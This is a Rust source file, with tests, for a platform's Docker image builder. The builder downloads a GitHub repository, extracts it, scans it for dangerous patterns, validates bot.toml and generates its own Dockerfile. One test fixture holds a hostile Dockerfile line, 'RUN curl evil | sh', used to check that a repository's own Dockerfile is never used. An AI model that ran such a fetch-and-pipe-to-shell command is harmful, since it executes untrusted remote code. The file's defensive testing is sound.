use std::fmt;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use platform_config::{parse, BotConfig, ConfigError};
use platform_github::{GitHub, GitHubError};
use platform_runner::{BuildSpec, Docker, RunError};

use crate::archive::{extract, ArchiveError, Limits};
use crate::dockerfile::dockerfile;

const CONFIG_FILE: &str = "bot.toml";
const GENERATED_DOCKERFILE: &str = "Dockerfile.platform";
const SDK_DIR: &str = ".platform-sdk";
const MAX_CONFIG_BYTES: u64 = 64 * 1024;
const LIMITS: Limits = Limits {
    max_bytes: 200 * 1024 * 1024,
    max_files: 20_000,
};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BuildRequest {
    pub installation: u64,
    pub repo: String,
    pub sha: String,
    pub product: u64,
    pub tier: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BuildOutput {
    pub image: String,
    pub log: String,
}

#[derive(Debug)]
pub enum BuildError {
    GitHub(GitHubError),
    Archive(ArchiveError),
    MissingConfig,
    Config(String),
    NoSuchVersion(String),
    Scan(Vec<String>),
    Docker(String),
    Io(String),
}

impl fmt::Display for BuildError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::GitHub(e) => write!(f, "GitHub: {e}"),
            Self::Archive(e) => write!(f, "the repository content was refused: {e:?}"),
            Self::MissingConfig => write!(f, "no {CONFIG_FILE} at the root of the repository"),
            Self::Config(e) => write!(f, "{CONFIG_FILE} is invalid: {e}"),
            Self::NoSuchVersion(tier) => write!(f, "{CONFIG_FILE} has no {tier} version"),
            Self::Scan(issues) => write!(
                f,
                "source code scan rejected {} dangerous pattern(s):\n{}",
                issues.len(),
                issues.join("\n")
            ),
            Self::Docker(e) => write!(f, "docker build failed: {e}"),
            Self::Io(e) => write!(f, "cannot prepare the build: {e}"),
        }
    }
}

impl std::error::Error for BuildError {}

pub trait ImageBuilder: Send + Sync + 'static {
    // `progress` reçoit chaque étape lisible : l'interface les affiche pendant que le build tourne.
    fn build(
        &self,
        request: &BuildRequest,
        progress: &mut dyn FnMut(&str),
    ) -> Result<BuildOutput, BuildError>;
}

// Un même commit donne toujours la même image : un retour en arrière n'a rien à reconstruire.
pub fn image_tag(product: u64, tier: &str, sha: &str) -> String {
    let short: String = sha.chars().take(12).collect();
    format!("platform-bot-{product}-{tier}:{short}")
}

pub struct DockerBuilder {
    github: Arc<dyn GitHub>,
    docker: Docker,
    work_dir: PathBuf,
    sdk_dir: Option<PathBuf>,
    timeout: Duration,
}

// Commun à toutes les instances : deux constructeurs ne partagent jamais un dossier de travail.
static COUNTER: AtomicU64 = AtomicU64::new(0);

impl DockerBuilder {
    pub fn new(
        github: Arc<dyn GitHub>,
        docker: Docker,
        work_dir: PathBuf,
        sdk_dir: Option<PathBuf>,
        timeout: Duration,
    ) -> Self {
        Self {
            github,
            docker,
            work_dir,
            sdk_dir,
            timeout,
        }
    }

    fn unique_dir(&self, request: &BuildRequest) -> PathBuf {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        self.work_dir.join(format!(
            "build-{}-{}-{}-{n}",
            request.product,
            request.tier,
            std::process::id()
        ))
    }
}

// Le dossier de travail est toujours supprimé, y compris quand le build échoue.
struct Cleanup(PathBuf);

impl Drop for Cleanup {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn read_config(dir: &Path) -> Result<BotConfig, BuildError> {
    let path = dir.join(CONFIG_FILE);
    let size = fs::metadata(&path)
        .map_err(|_| BuildError::MissingConfig)?
        .len();
    if size > MAX_CONFIG_BYTES {
        return Err(BuildError::Config("the file is too large".to_string()));
    }
    let text = fs::read_to_string(&path).map_err(|_| BuildError::MissingConfig)?;
    parse(&text).map_err(|e| {
        BuildError::Config(match e {
            ConfigError::Syntax(message) => message,
            ConfigError::Invalid(issues) => issues
                .iter()
                .map(|i| format!("{} ({:?})", i.field, i.problem))
                .collect::<Vec<_>>()
                .join(", "),
        })
    })
}

fn start_command<'a>(config: &'a BotConfig, tier: &str) -> Result<&'a str, BuildError> {
    match tier {
        "free" => Ok(&config.free.start_command),
        "premium" => config
            .premium
            .as_ref()
            .map(|p| p.start_command.as_str())
            .ok_or_else(|| BuildError::NoSuchVersion("premium".to_string())),
        other => Err(BuildError::NoSuchVersion(other.to_string())),
    }
}

// Le SDK de la plateforme est livré dans l'image : `import ... from "platform-sdk"` fonctionne.
fn copy_sdk(from: &Path, to: &Path) -> Result<(), BuildError> {
    let io = |e: std::io::Error| BuildError::Io(e.to_string());
    fs::create_dir_all(to.join("src")).map_err(io)?;
    fs::copy(from.join("package.json"), to.join("package.json")).map_err(io)?;
    for entry in fs::read_dir(from.join("src")).map_err(io)? {
        let entry = entry.map_err(io)?;
        if entry.file_type().map_err(io)?.is_file() {
            fs::copy(entry.path(), to.join("src").join(entry.file_name())).map_err(io)?;
        }
    }
    Ok(())
}

// Un build préparé : le dossier de travail existe tant que cette valeur vit.
struct Prepared {
    spec: BuildSpec,
    tag: String,
    _cleanup: Cleanup,
}

impl DockerBuilder {
    fn prepare(
        &self,
        request: &BuildRequest,
        progress: &mut dyn FnMut(&str),
    ) -> Result<Prepared, BuildError> {
        let short = &request.sha[..request.sha.len().min(7)];
        progress(&format!("Downloading {} at {short}", request.repo));
        let archive = self
            .github
            .download(request.installation, &request.repo, &request.sha)
            .map_err(BuildError::GitHub)?;
        let dir = self.unique_dir(request);
        let cleanup = Cleanup(dir.clone());
        extract(&archive, &dir, &LIMITS).map_err(BuildError::Archive)?;
        progress("Scanning source code for dangerous patterns");
        let violations = crate::scan::scan_dir(&dir);
        if !violations.is_empty() {
            let msgs: Vec<String> = violations
                .iter()
                .map(|v| format!("{}:{} — {} ({})", v.file, v.line, v.description, v.pattern))
                .collect();
            return Err(BuildError::Scan(msgs));
        }
        progress("Reading bot.toml");
        let config = read_config(&dir)?;
        let command = start_command(&config, &request.tier)?;
        let with_sdk = match (&self.sdk_dir, config.language) {
            (Some(sdk), platform_config::Language::Node) => {
                copy_sdk(sdk, &dir.join(SDK_DIR))?;
                true
            }
            _ => false,
        };
        fs::write(
            dir.join(GENERATED_DOCKERFILE),
            dockerfile(config.language, command, with_sdk),
        )
        .map_err(|e| BuildError::Io(e.to_string()))?;
        let tag = image_tag(request.product, &request.tier, &request.sha);
        progress(&format!("Building the image {tag}"));
        Ok(Prepared {
            spec: BuildSpec {
                context: dir.clone(),
                dockerfile: dir.join(GENERATED_DOCKERFILE),
                tag: tag.clone(),
                timeout: self.timeout,
            },
            tag,
            _cleanup: cleanup,
        })
    }
}

impl ImageBuilder for DockerBuilder {
    fn build(
        &self,
        request: &BuildRequest,
        progress: &mut dyn FnMut(&str),
    ) -> Result<BuildOutput, BuildError> {
        let prepared = self.prepare(request, progress)?;
        match self.docker.build(&prepared.spec) {
            Ok(log) => Ok(BuildOutput {
                image: prepared.tag.clone(),
                log,
            }),
            Err(RunError::Failed { stderr, .. }) => Err(BuildError::Docker(stderr)),
            Err(other) => Err(BuildError::Docker(format!("{other:?}"))),
        }
    }
}

#[cfg(test)]
mod tests {
    use platform_github::{Branch, Installation, Repo};

    use super::*;

    const SHA: &str = "0123456789abcdef0123456789abcdef01234567";

    struct FakeGitHub(Result<Vec<u8>, GitHubError>);

    impl GitHub for FakeGitHub {
        fn authorize_url(&self, _: &str, _: &str) -> Option<String> {
            None
        }
        fn install_url(&self) -> Option<String> {
            None
        }
        fn user_installations(&self, _: &str, _: &str) -> Result<Vec<Installation>, GitHubError> {
            Err(GitHubError::NotConfigured)
        }
        fn repositories(&self, _: u64) -> Result<Vec<Repo>, GitHubError> {
            Ok(vec![])
        }
        fn branches(&self, _: u64, _: &str) -> Result<Vec<Branch>, GitHubError> {
            Ok(vec![])
        }
        fn branch_head(&self, _: u64, _: &str, _: &str) -> Result<String, GitHubError> {
            Ok(SHA.to_string())
        }
        fn download(&self, _: u64, _: &str, _: &str) -> Result<Vec<u8>, GitHubError> {
            self.0.clone()
        }
    }

    fn request(tier: &str) -> BuildRequest {
        BuildRequest {
            installation: 7,
            repo: "alice/bot".to_string(),
            sha: SHA.to_string(),
            product: 3,
            tier: tier.to_string(),
        }
    }

    fn builder(archive: Result<Vec<u8>, GitHubError>) -> DockerBuilder {
        DockerBuilder::new(
            Arc::new(FakeGitHub(archive)),
            Docker::new("definitely-not-a-docker-binary"),
            std::env::temp_dir().join(format!("platform-builder-test-{}", std::process::id())),
            None,
            Duration::from_secs(5),
        )
    }

    fn tar_gz(files: &[(&str, &str)]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (path, content) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            let _ = builder.append_data(
                &mut header,
                format!("alice-bot-abc/{path}"),
                content.as_bytes(),
            );
        }
        let raw = builder.into_inner().unwrap_or_default();
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        let _ = std::io::Write::write_all(&mut encoder, &raw);
        encoder.finish().unwrap_or_default()
    }

    const FREE_ONLY: &str = r#"
schema_version = 1
name = "Alice Bot"
language = "node"
support_contact = "alice@example.com"
[free]
start_command = "node index.js"
"#;

    const BOTH: &str = r#"
schema_version = 1
name = "Alice Bot"
language = "node"
support_contact = "alice@example.com"
[free]
start_command = "node index.js"
[premium]
start_command = "node index.js"
[[premium.plans]]
id = "monthly"
interval = "month"
price_cents = 500
"#;

    fn run(archive: Vec<u8>, tier: &str) -> (Result<BuildOutput, BuildError>, Vec<String>) {
        let mut steps = Vec::new();
        let result = builder(Ok(archive)).build(&request(tier), &mut |s| steps.push(s.to_string()));
        (result, steps)
    }

    #[test]
    fn the_image_tag_depends_on_the_bot_the_version_and_the_commit() {
        assert_eq!(
            image_tag(3, "free", SHA),
            "platform-bot-3-free:0123456789ab"
        );
        assert_ne!(image_tag(3, "free", SHA), image_tag(3, "premium", SHA));
        assert_ne!(image_tag(3, "free", SHA), image_tag(4, "free", SHA));
        assert_ne!(
            image_tag(3, "free", SHA),
            image_tag(3, "free", &"f".repeat(40))
        );
        assert_eq!(image_tag(1, "free", "abc"), "platform-bot-1-free:abc");
    }

    #[test]
    fn github_failures_stop_the_build_at_the_download() {
        let (result, steps) = {
            let mut steps = Vec::new();
            let r = builder(Err(GitHubError::NotFound))
                .build(&request("free"), &mut |s| steps.push(s.to_string()));
            (r, steps)
        };
        assert!(matches!(
            result,
            Err(BuildError::GitHub(GitHubError::NotFound))
        ));
        assert_eq!(steps, ["Downloading alice/bot at 0123456"]);
    }

    #[test]
    fn a_repository_without_bot_toml_is_refused_with_a_clear_message() {
        let (result, steps) = run(tar_gz(&[("index.js", "x")]), "free");
        let message = result.err().map(|e| e.to_string()).unwrap_or_default();
        assert_eq!(message, "no bot.toml at the root of the repository");
        assert_eq!(steps.len(), 3);
    }

    #[test]
    fn an_invalid_bot_toml_names_the_problem() {
        let (result, _) = run(tar_gz(&[("bot.toml", "this is not toml")]), "free");
        assert!(matches!(result, Err(BuildError::Config(_))));
        let bad_price = BOTH.replace("500", "10");
        let (result, _) = run(tar_gz(&[("bot.toml", &bad_price)]), "free");
        let message = result.err().map(|e| e.to_string()).unwrap_or_default();
        assert!(
            message.contains("bot.toml is invalid") && message.contains("PriceBelowFloor"),
            "{message}"
        );
    }

    #[test]
    fn asking_for_a_version_the_config_does_not_declare_is_refused() {
        let (result, _) = run(tar_gz(&[("bot.toml", FREE_ONLY)]), "premium");
        assert!(matches!(result, Err(BuildError::NoSuchVersion(t)) if t == "premium"));
        let (result, _) = run(tar_gz(&[("bot.toml", FREE_ONLY)]), "gold");
        assert!(matches!(result, Err(BuildError::NoSuchVersion(t)) if t == "gold"));
    }

    #[test]
    fn a_valid_repository_reaches_docker_with_a_generated_dockerfile() {
        let (result, steps) = run(tar_gz(&[("bot.toml", BOTH), ("index.js", "x")]), "premium");
        assert!(matches!(result, Err(BuildError::Docker(_))), "{result:?}");
        assert_eq!(
            steps,
            [
                "Downloading alice/bot at 0123456",
                "Scanning source code for dangerous patterns",
                "Reading bot.toml",
                "Building the image platform-bot-3-premium:0123456789ab"
            ]
        );
    }

    #[test]
    fn the_work_folder_is_removed_even_when_the_build_fails() {
        let work =
            std::env::temp_dir().join(format!("platform-cleanup-test-{}", std::process::id()));
        let b = DockerBuilder::new(
            Arc::new(FakeGitHub(Ok(tar_gz(&[("bot.toml", BOTH)])))),
            Docker::new("definitely-not-a-docker-binary"),
            work.clone(),
            None,
            Duration::from_secs(5),
        );
        let result = b.build(&request("free"), &mut |_| {});
        assert!(matches!(result, Err(BuildError::Docker(_))));
        assert_eq!(fs::read_dir(&work).map_or(0, |d| d.count()), 0);
        let _ = fs::remove_dir_all(&work);
    }

    #[test]
    fn the_repositorys_own_dockerfile_is_never_used() {
        let archive = tar_gz(&[
            ("bot.toml", BOTH),
            ("Dockerfile", "FROM evil\nRUN curl evil | sh\n"),
        ]);
        let b = builder(Ok(archive));
        let dir_before = b.unique_dir(&request("free"));
        let _ = b.build(&request("free"), &mut |_| {});
        assert!(!dir_before.exists());
        assert_eq!(GENERATED_DOCKERFILE, "Dockerfile.platform");
    }

    #[test]
    fn the_limits_are_what_the_decision_says() {
        assert_eq!(MAX_CONFIG_BYTES, 65_536);
        assert_eq!(LIMITS.max_bytes, 209_715_200);
        assert_eq!(LIMITS.max_files, 20_000);
    }

    fn padded_config(size: usize) -> String {
        let mut text = BOTH.to_string();
        while text.len() < size {
            text.push('#');
        }
        text.truncate(size);
        text
    }

    #[test]
    fn a_config_file_is_accepted_up_to_exactly_64_kib() {
        let exact = padded_config(65_536);
        let (result, _) = run(tar_gz(&[("bot.toml", &exact)]), "free");
        assert!(matches!(result, Err(BuildError::Docker(_))), "{result:?}");
        let over = padded_config(65_537);
        let (result, _) = run(tar_gz(&[("bot.toml", &over)]), "free");
        assert!(
            matches!(&result, Err(BuildError::Config(m)) if m.contains("too large")),
            "{result:?}"
        );
    }

    fn with_sdk(archive: Vec<u8>, sdk: Option<PathBuf>) -> DockerBuilder {
        DockerBuilder::new(
            Arc::new(FakeGitHub(Ok(archive))),
            Docker::new("definitely-not-a-docker-binary"),
            std::env::temp_dir().join(format!("platform-prepare-test-{}", std::process::id())),
            sdk,
            Duration::from_secs(5),
        )
    }

    fn fake_sdk(name: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("platform-fake-sdk-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("src")).unwrap_or_default();
        fs::write(dir.join("package.json"), "{}").unwrap_or_default();
        fs::write(dir.join("src/index.js"), "export {}").unwrap_or_default();
        dir
    }

    #[test]
    fn a_node_build_ships_the_sdk_and_says_so_in_the_dockerfile() {
        let sdk = fake_sdk("node");
        let b = with_sdk(tar_gz(&[("bot.toml", BOTH)]), Some(sdk.clone()));
        let prepared = b.prepare(&request("free"), &mut |_| {});
        let Ok(prepared) = prepared else {
            panic!(
                "prepare failed: {:?}",
                prepared.err().map(|e| e.to_string())
            );
        };
        let context = &prepared.spec.context;
        assert_eq!(
            fs::read_to_string(context.join(".platform-sdk/src/index.js"))
                .ok()
                .as_deref(),
            Some("export {}")
        );
        assert!(context.join(".platform-sdk/package.json").exists());
        let generated = fs::read_to_string(&prepared.spec.dockerfile).unwrap_or_default();
        assert!(generated.contains("COPY .platform-sdk /app/node_modules/platform-sdk"));
        assert!(generated.contains(r#"CMD ["sh", "-c", "node index.js"]"#));
        assert_eq!(prepared.spec.tag, "platform-bot-3-free:0123456789ab");
        assert_eq!(prepared.spec.timeout, Duration::from_secs(5));
        let kept = context.clone();
        drop(prepared);
        assert!(
            !kept.exists(),
            "the folder goes away with the prepared build"
        );
        let _ = fs::remove_dir_all(&sdk);
    }

    #[test]
    fn without_an_sdk_folder_or_for_other_languages_nothing_is_copied() {
        let none = with_sdk(tar_gz(&[("bot.toml", BOTH)]), None);
        let prepared = none.prepare(&request("free"), &mut |_| {});
        let Ok(prepared) = prepared else {
            panic!("prepare failed")
        };
        assert!(!prepared.spec.context.join(".platform-sdk").exists());
        assert!(!fs::read_to_string(&prepared.spec.dockerfile)
            .unwrap_or_default()
            .contains(".platform-sdk"));
        drop(prepared);
        let sdk = fake_sdk("python");
        let python = BOTH.replace("language = \"node\"", "language = \"python\"");
        let b = with_sdk(tar_gz(&[("bot.toml", &python)]), Some(sdk.clone()));
        let prepared = b.prepare(&request("free"), &mut |_| {});
        let Ok(prepared) = prepared else {
            panic!("prepare failed")
        };
        assert!(!prepared.spec.context.join(".platform-sdk").exists());
        assert!(fs::read_to_string(&prepared.spec.dockerfile)
            .unwrap_or_default()
            .starts_with("FROM python"));
        let _ = fs::remove_dir_all(&sdk);
    }

    #[test]
    fn a_broken_sdk_folder_stops_the_build_with_a_clear_error() {
        let sdk = std::env::temp_dir().join("platform-no-such-sdk-folder");
        let b = with_sdk(tar_gz(&[("bot.toml", BOTH)]), Some(sdk));
        assert!(matches!(
            b.prepare(&request("free"), &mut |_| {}),
            Err(BuildError::Io(_))
        ));
    }
}
